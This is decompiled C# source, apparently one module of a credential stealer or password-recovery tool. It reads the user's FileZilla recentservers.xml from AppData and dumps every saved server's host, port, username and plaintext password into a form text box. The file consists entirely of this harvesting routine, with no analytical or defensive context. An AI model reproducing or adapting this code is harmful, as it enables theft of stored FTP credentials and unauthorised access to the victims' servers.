using System;
using System.Collections;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000010 RID: 16
[StandardModule]
internal sealed class Class4
{
	// Token: 0x0600002E RID: 46 RVA: 0x00003B00 File Offset: 0x00001D00
	public static void smethod_0()
	{
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(Interaction.Environ("AppData") + "\\FileZilla\\recentservers.xml");
		int num = 1;
		Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + ">>>>>>>>>>FileZilla<<<<<<<<<<" + Environment.NewLine;
		checked
		{
			try
			{
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + "\r\nID: " + num.ToString() + "\r\n";
					Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + "Host: " + xmlNode.ChildNodes[0].InnerText + "\r\n";
					Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + "Port: " + xmlNode.ChildNodes[1].InnerText + "\r\n";
					Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + "User: " + xmlNode.ChildNodes[4].InnerText + "\r\n";
					Class1.MyForms_0.Form1_0.TextBox1.Text = Class1.MyForms_0.Form1_0.TextBox1.Text + "Pass: " + xmlNode.ChildNodes[5].InnerText + "\r\n";
					num++;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}
}
